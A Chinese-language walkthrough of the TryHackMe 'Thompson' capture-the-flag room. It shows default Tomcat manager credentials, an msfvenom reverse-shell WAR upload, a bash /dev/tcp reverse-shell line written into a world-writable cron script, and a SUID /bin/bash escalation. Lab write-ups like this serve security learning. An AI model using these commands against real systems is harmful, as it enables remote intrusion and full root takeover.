## 概述

來源: tryhackme
題目: Thompson
難度: easy
網址: https://tryhackme.com/room/bsidesgtthompson

## 掃描 port

```!=
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fc:05:24:81:98:7e:b8:db:05:92:a6:e7:8e:b0:21:11 (RSA)
|   256 60:c8:40:ab:b0:09:84:3d:46:64:61:13:fa:bc:1f:be (ECDSA)
|_  256 b5:52:7e:9c:01:9b:98:0c:73:59:20:35:ee:23:f1:a5 (ED25519)
8009/tcp open  ajp13   Apache Jserv (Protocol v1.3)
|_ajp-methods: Failed to get a valid response for the OPTION request
8080/tcp open  http    Apache Tomcat 8.5.5
|_http-title: Apache Tomcat/8.5.5
|_http-favicon: Apache Tomcat
| http-methods:
|_  Supported Methods: GET HEAD POST
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### 掃描可用路徑

```!=
┌──(kali㉿kali)-[~]
└─$ gobuster dir -u http://10.201.43.69:8080/ -w /usr/share/seclists/Discovery/Web-Content/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.201.43.69:8080/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/docs                 (Status: 302) [Size: 0] [--> /docs/]
/examples             (Status: 302) [Size: 0] [--> /examples/]
/favicon.ico          (Status: 200) [Size: 21630]
/host-manager         (Status: 302) [Size: 0] [--> /host-manager/]
/manager              (Status: 302) [Size: 0] [--> /manager/]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================
```

## 登入 tomcat manager

發現`8080`port 是 tomcat
且`/manager`登入失敗後跳出帳號密碼資訊

```
http://target_id:8080/manager/
```

![image](https://hackmd.io/_uploads/H10hDImRel.png)
透過`tomcat:s3cret`
登入成功

## .war 取得 shell

發現可上傳`.war`檔案
嘗試取得 shell
![image](https://hackmd.io/_uploads/HJYMu8QCex.png)
先製作`shell.war`

```!=
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=local_ip LPORT=666 -f war -o shell.war
Payload size: 1094 bytes
Final size of war file: 1094 bytes
Saved as: shell.war
```

將`shell.war`上傳後
![image](https://hackmd.io/_uploads/ByuCOL7Ael.png)

監聽 666

```!=
nc -nvlp 666
```

造訪頁面

```!=
http://10.201.68.84:8080/shell/
```

shell get

```!=
└─$ nc -nvlp 666
listening on [any] 666 ...
connect to [10.8.68.234] from (UNKNOWN) [10.201.68.84] 36576
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

### 取得 user.txt

穩定 shell

```!=
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@ubuntu:/$
```

```!=
tomcat@ubuntu:/home/jack$ cat user.txt
cat user.txt
39...bf
```

## 提權 1

發現`id.sh`好像能執行 root 權限

```!=
tomcat@ubuntu:/home/jack$ ls -l
ls -l
total 12
-rwxrwxrwx 1 jack jack 26 Aug 14  2019 id.sh
-rw-r--r-- 1 root root 39 Oct 19 23:41 test.txt
-rw-rw-r-- 1 jack jack 33 Aug 14  2019 user.txt
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
#!/bin/bash
id > test.txt
tomcat@ubuntu:/home/jack$ cat test.txt
cat test.txt
uid=0(root) gid=0(root) groups=0(root)
```

而且我們也可以修改`id.sh`
嘗試取得 root shell

```!=
echo 'bash -i >& /dev/tcp/local_ip/6666 0>&1' > id.sh
```

監聽 6666

```!=
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 6666
listening on [any] 6666 ...
```

等待 1~5 分鐘系統自動觸發`id.sh`
取得 root shell

```!=
┌──(kali㉿kali)-[~]
└─$ nc -nvlp 6666
listening on [any] 6666 ...
id
connect to [10.8.68.234] from (UNKNOWN) [10.201.68.84] 35730
bash: cannot set terminal process group (919): Inappropriate ioctl for device
bash: no job control in this shell
root@ubuntu:/home/jack# id
uid=0(root) gid=0(root) groups=0(root)
```

取得`root.txt`

```!=
root@ubuntu:/home/jack# cd ~
cd ~
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
d8...3a
```

## 提權 2

確認`/bin/bash`權限

```!=
tomcat@ubuntu:/home/jack$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

發現檔案擁有者是 root
利用`id.sh`修改`/bin/bash`權限
新增`suid`權限以取得 root 權限

```!=
tomcat@ubuntu:/home/jack$ echo 'chmod +s /bin/bash' > id.sh
echo 'chmod +s /bin/bash' > id.sh
tomcat@ubuntu:/home/jack$ cat id.sh
cat id.sh
chmod +s /bin/bash
```

等待系統自動執行`id.sh`
確定`/bin/bash`權限有`s`

```!=
tomcat@ubuntu:/home/jack$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

使用 root 執行 bash

```!=
tomcat@ubuntu:/home/jack$ /bin/bash -p
/bin/bash -p
bash-4.3# id
id
uid=1001(tomcat) gid=1001(tomcat) euid=0(root) egid=0(root) groups=0(root),1001(tomcat)
```

> `/bin/bash -p`  
> -p = privileged mode（特權模式）
>
> 不加 -p：bash 會自動降低權限（安全機制）
> 加 -p：bash 保留 SUID 權限，讓你真的以 root 執行

取得`root.txt`

```!=
bash-4.3# cd /root
cd /root
bash-4.3# cat root.txt
cat root.txt
d8...3a
```

補充一下
如果沒有`s`權限`-p`沒功用

```!=
tomcat@ubuntu:/$ ls -l /bin/bash
ls -l /bin/bash
-rwxr-xr-x 1 root root 1037528 Jul 12  2019 /bin/bash
tomcat@ubuntu:/$ /bin/bash -p
/bin/bash -p
tomcat@ubuntu:/$ id
id
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
tomcat@ubuntu:/$
```

## 不提權直接拿 root.txt

嘗試直接把`root.txt`複製出來

```!=
tomcat@ubuntu:/home/jack$ echo "cp /root/root.txt /home/jack/root.txt" > id.sh
```

等待系統執行`id.sh`
成功取得`root.txt`

```!=
tomcat@ubuntu:/home/jack$ ls
ls
id.sh  test.txt  user.txt
tomcat@ubuntu:/home/jack$ ls
ls
id.sh  root.txt  test.txt  user.txt
tomcat@ubuntu:/home/jack$ cat root.txt
cat root.txt
d8...3a
```
